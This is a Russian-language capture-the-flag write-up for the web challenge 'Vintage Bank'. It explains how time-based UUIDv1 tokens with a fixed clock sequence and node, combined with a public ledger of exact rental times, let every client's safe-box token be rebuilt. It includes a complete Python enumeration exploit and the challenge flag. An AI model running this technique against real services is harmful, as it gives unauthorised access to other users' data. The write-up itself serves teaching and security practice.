# Vintage Bank

**Категория:** Web
**Флаг:** `SOLARCTF{idor_s4fe_d3posit_b0x}`

## Дано

Текстовый квест-сайт `https://vintage-bank.solarctf.ru` в стиле "древнейший банк для самых богатых": арендуешь сейфовую ячейку, получаешь токен, по токену смотришь содержимое ячейки.

## Разведка API

Вся логика видна прямо в `static/js/script.js`, ручек всего три:

- `POST api/rent` → `{"token": "<uuid>", "cell": N}`, аренда новой ячейки;
- `GET api/cell/<token>` → `{"flag": ..., "cell": ..., "owner": ...}`, содержимое по токену;
- `GET api/ledger` → открытый реестр из 26 клиентов: `{ord, name, date, cell}`, без токенов, зато с точными датами аренды.

Невалидный токен легко отличить от валидного: у существующей ячейки `cell` не `null`, у несуществующей `cell: null` при тех же 200 OK. Готовый оракул для перебора.

## Уязвимость: предсказуемый UUIDv1

Токены выглядят как `d741df00-ca0d-11f1-9a2b-0242ac110002`, это UUID версии 1 (time-based). Беря несколько аренд подряд и сравнивая токены, видно:

- `clock_seq` всегда один и тот же (`9a2b`), генератор не рандомизирует его на каждый вызов;
- `node` тоже константа (`0242ac110002`), это MAC докер-контейнера;
- временная часть считается с гранулярностью в целую секунду: два запроса в пределах одной секунды возвращают **идентичный** токен, то есть кастомный генератор просто берёт `unix_second * 10^7` без субсекундной части.

То есть весь токен однозначно определяется секундой, в которую он выдан. А `api/ledger` публикует точную дату и время аренды каждого клиента — значит, токены всех 26 клиентов восстанавливаются без перебора, просто пересчётом времени в UUID.

## Эксплойт

```python
import json, time, urllib.request
from concurrent.futures import ThreadPoolExecutor

BASE = "https://vintage-bank.solarctf.ru"
CLOCK_SEQ_RAW = 0x9a2b
NODE = 0x0242ac110002
UUID_EPOCH_OFFSET = 12219292800  # секунд между 1582-10-15 и 1970-01-01

def http(path, method="GET"):
    req = urllib.request.Request(BASE + path, data=(b"" if method == "POST" else None),
                                  method=method, headers={"User-Agent": "solve/1"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read().decode())

def token_for_unix(unix_seconds):
    t = (int(unix_seconds) + UUID_EPOCH_OFFSET) * 10_000_000
    return "%08x-%04x-%04x-%04x-%012x" % (
        t & 0xffffffff, (t >> 32) & 0xffff,
        ((t >> 48) & 0x0fff) | 0x1000, CLOCK_SEQ_RAW, NODE)

mine = http("/api/rent", method="POST")
# токен, посчитанный от текущей unix-секунды, совпадает с выданным — модель подтверждена

ledger = http("/api/ledger")
cands = []
for e in ledger:
    dt = time.mktime(time.strptime(e["date"], "%d.%m.%Y %H:%M:%S")) - time.timezone
    cands.append((e, token_for_unix(dt)))

def probe(item):
    e, tok = item
    try:
        return e, tok, http("/api/cell/" + tok)
    except Exception:
        return e, tok, None

with ThreadPoolExecutor(max_workers=24) as ex:
    for e, tok, data in ex.map(probe, cands):
        if data and data.get("cell") is not None and data.get("flag"):
            print(data)
```

23 из 26 восстановленных токенов оказываются валидными. Один из них, ячейка №6 (клиентка "Смирнова Е.", аренда 23.04.2026 12:22:34), отдаёт:

```json
{"cell": 6, "owner": "Смирнова Е.", "flag": "SOLARCTF{idor_s4fe_d3posit_b0x}"}
```

Само название флага подтверждает класс уязвимости: IDOR, доступ к чужим ресурсам по предсказуемому идентификатору.

## Вывод

UUIDv1 не секретен по построению: время, MAC-адрес и clock_seq либо наблюдаемы напрямую, либо тривиально перечисляются. Публикация точных дат операций в открытом реестре в связке с time-based идентификаторами ресурсов это детерминированная утечка всех идентификаторов разом, без единого запроса "в слепую". Дополнительный штрих: повторная аренда в ту же секунду выдаёт точный дубликат токена, что ещё раз выдаёт самодельный генератор.
